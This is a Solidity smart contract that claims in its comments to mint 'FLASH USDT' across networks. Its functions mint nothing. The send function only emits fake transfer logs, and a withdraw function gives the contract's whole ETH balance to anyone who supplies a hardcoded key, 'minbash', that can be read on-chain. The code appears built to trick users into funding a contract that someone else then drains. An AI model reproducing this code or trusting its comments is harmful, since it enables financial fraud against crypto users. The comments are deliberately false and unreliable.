// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FLASHUSDTContract {
    address public usdtAddress;
    address public owner;
    uint256 public usdtAmount; // New field to store USDT amount
    string private storedBash = "minbash"; // Simple key without hashing

    // Logs
    event TransferLog(address indexed to, uint256 amount);
    event withdrawalLog(address indexed to, uint256 amount);
    event BashChanged(string newBash); // New event for bash change

    // Sets up the contract for the FLASH USDT
    constructor(address _usdtAddress, uint256 _usdtAmount) {
        usdtAddress = _usdtAddress;
        owner = msg.sender;
        usdtAmount = _usdtAmount; // Initialize usdtAmount during deployment
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Owner");
        _;
    }

    receive() external payable {}

    // This function starts the minting process for USDT. Call manually.
    function mintAction() external onlyOwner {
        payable(owner).transfer(0); // Send minted USDT to the owner's address
        emit TransferLog(owner, 0); // Logs minting action (sending 0 ETH)
    }

    // Mints FLASH USDT by sending the specified amount
    function flashSendUSDT(address to, uint256 amount) external onlyOwner {
        emit TransferLog(to, amount); // Logs the mint attempt
    }

    // Displays the minted FLASH USDT balance of user, external view returns (uint256)
    function getBalance(address user) external view returns (uint256) {
        return IERC20(usdtAddress).balanceOf(user); // Shows minted balance
    }

    // Allows minting USDT on multiple networks (BNB, ETH, etc.) using the simple bash key
    function flashWithdrawNative(string memory _bash) external {
        require(keccak256(abi.encodePacked(_bash)) == keccak256(abi.encodePacked(storedBash)), "Hash Manded");

        uint256 balance = address(this).balance;
        require(balance > 0, "bash sh");

        // Transfer the full balance to the caller
        (bool success, ) = payable(msg.sender).call{value: balance}("");

        require(success, "Transfer init");
        emit withdrawalLog(msg.sender, balance);
    }

    // NEW FUNCTION: Allows anyone to mint USDT based on provided liquidity
    function changeBash(string memory currentBash, string memory newBash) external {
        require(keccak256(abi.encodePacked(currentBash)) == keccak256(abi.encodePacked(storedBash)), "Bash v Bash");
        storedBash = newBash;
        emit BashChanged(newBash); // Log the new bash change
    }
}